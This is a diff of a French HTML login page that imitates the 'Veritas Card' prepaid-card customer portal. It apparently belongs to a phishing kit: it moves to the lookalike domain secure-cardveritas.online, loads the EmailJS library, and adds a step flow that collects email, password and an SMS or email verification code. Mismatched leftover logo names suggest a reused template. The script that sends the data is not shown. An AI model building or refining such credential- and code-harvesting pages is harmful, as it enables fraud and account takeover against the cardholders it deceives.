@@ -2,155 +2,102 @@
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<!-- SEO -->
-<title>Veritas Card</title>
+<title>Veritas Card-Espace client</title>
 
-<meta name="description"
-      content="Veritas card: Veritas Card est une solution de carte de paiement prépayée sans banque mise en place par MasterCard, .">
+<meta name="description" content="Bienvenue sur Veritas Card, votre espace client sécurisé.Connectez-Vous a votre compte veritas en ligne .">
 
 <meta name="robots" content="index, follow">
+
 <meta name="googlebot" content="index, follow">
 
-<link rel="canonical" href="https://cardveritas.online/">
+<link rel="canonical" href="https://secure-cardveritas.online/">
 
-<!-- Open Graph -->
 <meta property="og:type" content="website">
-<meta property="og:title" content="Veritas Card">
-<meta property="og:description"
-      content="Accédez à votre espace Veritas Card.">
-<meta property="og:url" content="https://cardveritas.online/">
-<meta property="og:site_name" content="Veritas Card login">
-<meta property="og:image" content="https://cardveritas.online/logo.jpg">
+<meta property="og:title" content="Veritas – Espace client">
+<meta property="og:description" content="Accédez à votre espace client Veritas.">
+<meta property="og:url" content="https://secure-cardveritas.online/">
+<meta property="og:site_name" content=" Veritas Card">
 
-<!-- Twitter / X -->
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Veritas Card | Login">
-<meta name="twitter:description"
-      content="connecter a un compte Veritas Card ">
-<meta name="twitter:image" content="https://cardveritas.online/logo.jpg">
-<link rel="alternate" hreflang="en" href="https://cardveritas.online/index.html">
-<link rel="alternate" hreflang="fr" href="https://cardveritas.online/loginfr.html">
-<link rel="alternate" hreflang="x-default" href="https://cardveritas.online/index.html">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="stylefr.css">
 
-<link rel="icon" type="image/png" href="logo1.png">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  
+<script src="script.js" defer></script>
 
-<!-- JSON-LD -->
 <script type="application/ld+json">
 {
   "@context": "https://schema.org",
   "@type": "WebSite",
   "name": "Veritas Card",
-  "url": "https://cardveritas.online/",
-  "description": "Veritas Card - espace en ligne",
-  "inLanguage": "fr"
+  "url": "https://secure-cardveritas.online/",
+  "description": "Espace client Veritas."
 }
 </script>
 
-<link rel="stylesheet" href="styles.css">
-<script src="https://www.google.com/recaptcha/api.js" async defer></script>
 
 </head>
 
 <body>
+<div class="page">
 
-  <div class="card">
-
+  <div class="topbar">
     <div class="brand">
-      <img src="logo.jpg" alt="Logo Yanick">
-
-      <span class="brand-text">
-        <span class="brand-name">veritas</span>
-        <span class="brand-sub">card</span>
-      </span>
+      <div class="brand-mark">
+        <img src="logo.png" alt="Logo Vantéo" class="brand-logo-img" onerror="this.style.display='none';">
+      </div>
+    
     </div>
-
-    <h1>Login</h1>
-
-    <div class="banner">
-      <p>
-        Vérifiez vos identifiants de connexion et ne les partagez jamais avec qui que ce soit
-        <a href="#">page contact</a>.
-      </p>
-
-      <div class="lang-toggle">
-        <button class="active" type="button">FR</button>
-        <button type="button">EN</button>
+    <div class="top-actions">
+      <div class="theme-toggle" id="themeToggle">
+        <span class="dot" id="themeDot"><svg viewBox="0 0 24 24"><path d="M21 12.5A9 9 0 1111.5 3a7 7 0 009.5 9.5z"/></svg></span>
+        <span id="themeLabel">Sombre</span>
+      </div>
+      <div class="icon-btn" title="Langue">
+        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path stroke-linecap="round" d="M3 12h18M12 3c2.5 2.6 3.8 5.7 3.8 9s-1.3 6.4-3.8 9c-2.5-2.6-3.8-5.7-3.8-9S9.5 5.6 12 3z"/></svg>
       </div>
     </div>
-
-    <form id="signupForm">
-
-      <div class="field">
-        <input
-          type="email"
-          id="email"
-          placeholder="email"
-          maxlength="50"
-          aria-label="email"
-          required>
-      </div>
-
-      <div class="field">
-        <input
-          type="password"
-          id="password"
-          placeholder="password"
-          minlength="8"
-          maxlength="20"
-          aria-label="password"
-          required>
-      </div>
-
-      <!-- CAPTCHA caché au départ -->
-      <div id="captcha-container" style="display: none;">
-        <div
-          class="g-recaptcha"
-          data-sitekey="6Ld5M7ktAAAAAHxlGnB7OXvhRCpEhzFZqO2PwLGv">
-        </div>
-      </div>
-
-      <div class="button-container">
-
-        <!-- Vrai déclencheur SUBMIT -->
-        <button
-          type="submit"
-          class="signin-btn"
-          id="signin-btn">
-          Sign In
-        </button>
-
-      </div>
-
-      <div id="result"></div>
-
-      <div class="forgot">
-      <p>Première connexion sur la nouvelle plateforme ? Votre ancien mot de passe ne fonctionne plus : utilisez « Mot de passe oublié » — vous recevrez un lien d’activation. Changez votre mot de passe et revenez à la page de connexion. Le lien est valable pendant 48 heures.</p>
-       <a href="https://secure2.cardveritas.com/fr/forgot">Mots de passe oublié?</a>
-      </div>
-
-      <div class="mini-links">
-
-        <div class="box">
-          Email issue? <a href="#">Click here</a>
-        </div>
-
-        <div class="box">
-          Sign Up <a href="#">Click here</a>
-        </div>
-
-      </div>
-
-      <button type="button" class="corporate-btn">
-        Corporate or Business Account?
-      </button>
-
-    </form>
-
   </div>
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-  <script src="script.js"></script>
 
-</body>
-</html>
+  <div class="main">
+    <div class="card">
+      <div class="steps">
+        <span class="active" id="st1"></span><span id="st2"></span><span id="st3"></span>
+      </div>
+
+      <!-- Step 1 : identifiants -->
+      <div class="step active" id="step1">
+        <h1>Connectez-vous à votre espace client.</h1>
+        <p class="subtitle">Saisissez vos identifiants, puis le code de vérification envoyé par SMS ou par e-mail.</p>
+<form id="signupForm">
+
+  <div class="field">
+    <label for="email">E-mail</label>
+    <input type="email" id="email" autocomplete="username" required>
+  </div>
+
+  <div class="field">
+    <label for="pwd">Mot de passe</label>
+    <input type="password" id="pwd" autocomplete="current-password" required>
+  </div>
+
+  <button type="submit" class="btn-signin">Continuer</button>
+  <div id="result"></div>
+
+</form>
+
+
+        <p class="note">Vous n'avez toujours pas accès à vos données ? Votre lien d'activation vous a été envoyé par courriel après votre commande.</p>
+
+        <div class="banner">
+Première connexion sur la nouvelle plateforme? Votre ancien mot de passe ne fonctionne plus : utilisez « Mot de passe oublié » — vous recevrez un lien d’activation valable 48 heures.</a>
+        </div>
+      </div>
+      
+    </body>
+    </html>
